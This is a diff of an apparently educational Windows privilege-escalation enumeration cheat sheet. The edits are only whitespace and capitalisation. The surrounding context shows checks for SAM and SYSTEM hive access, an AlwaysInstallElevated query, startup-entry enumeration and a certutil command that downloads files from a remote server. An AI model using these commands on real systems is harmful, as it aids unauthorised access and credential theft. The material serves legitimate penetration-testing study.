@@ -17,6 +17,7 @@ _Note: I am not an expert and still learning myself._
 In each section I first provide the old trusted CMD commands and then also a Powershell equivalent for posterity sake. It's good to have both tools under your belt and Powershell is much more versatile for scripting than the traditional CMD. However there isn't a Powershell equivalent for everything (or CMD is still simply easier/better on certain things), so some sections will only contain regular CMD commands. 
 
 
+
 ## Operating System
 
 
@@ -57,6 +58,7 @@ wmic logicaldisk get caption,description,providername
 Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
 
 ```
+
 
 
 ## Users
@@ -164,6 +166,7 @@ Can we access SAM and SYSTEM files?
 %SYSTEMROOT%\System32\config\RegBack\system
 
 ```
+
 
 
 ## Programs, Processes, and Services
@@ -303,8 +306,8 @@ Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\
 Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
 Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
 Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'
-get-childitem "C:\Users\All Users\Start Menu\Programs\Startup"
-get-childitem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
+Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
+Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
 
 ```
 
@@ -316,6 +319,7 @@ Is AlwaysInstallElevated enabled? _I have not ran across this but it doesn't hur
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
 ```
+
 
 
 ## Networking
@@ -413,7 +417,9 @@ Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 ```
 
 
+
 ## Interesting Files and Sensitive Information
+
 
 
 This section may be a little noisy so you may want to output commands into txt files to review and parse as you wish.
@@ -526,7 +532,9 @@ Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction Sil
 ```
 
 
+
 # Appendix
+
 
 
 ## Transferring Files
@@ -585,7 +593,10 @@ certutil.exe -urlcache -split -f https://myserver/filename outputfilename
 
 ```
 
+
+
 ## Port Forwarding
+
 
 This is useful for exposing inside services that aren't available from outside the machine, normally due to firewall settings.
 
